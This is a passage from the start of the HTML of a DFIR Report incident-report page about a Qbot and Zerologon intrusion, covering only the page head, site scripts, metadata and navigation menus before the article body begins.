<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>Qbot and Zerologon Lead To Full Domain Compromise &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="1a310a3e4aa21af3edc3a22f-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/14.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.1/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.7.1' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/14.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/14.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://c0.wp.com/p/jetpack/14.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="1a310a3e4aa21af3edc3a22f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/5552" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=5552' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2022%2F02%2F21%2Fqbot-and-zerologon-lead-to-full-domain-compromise%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2022%2F02%2F21%2Fqbot-and-zerologon-lead-to-full-domain-compromise%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="1a310a3e4aa21af3edc3a22f-text/javascript"></script>
		<script type="1a310a3e4aa21af3edc3a22f-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="1a310a3e4aa21af3edc3a22f-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=81F41D788787816FE5530DDDD470E325');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Qbot and Zerologon Lead To Full Domain Compromise" />
<meta property="og:url" content="https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/" />
<meta property="og:description" content="In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot paylo…" />
<meta property="article:published_time" content="2022-02-21T02:04:48+00:00" />
<meta property="article:modified_time" content="2022-12-23T19:03:43+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain.png" />
<meta property="og:image:width" content="2011" />
<meta property="og:image:height" content="858" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Qbot and Zerologon Lead To Full Domain Compromise" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2022/02/qbot_chain.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-5552 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
